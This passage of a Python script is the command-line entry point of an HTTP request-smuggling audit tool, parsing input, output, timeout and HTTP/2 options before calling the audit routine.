    parser = argparse.ArgumentParser(description="Argus HTTP Smuggling Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=live, help="Input URL file")
    parser.add_argument("--output", type=Path, default=out, help="Output directory")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Socket timeout")
    parser.add_argument("--no-h2", action="store_true", help="Skip HTTP/2 probes")
    args = parser.parse_args()

    try:
        run_smuggling_audit(
            args.input, args.output,
            timeout=args.timeout,
            test_h2=not args.no_h2,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
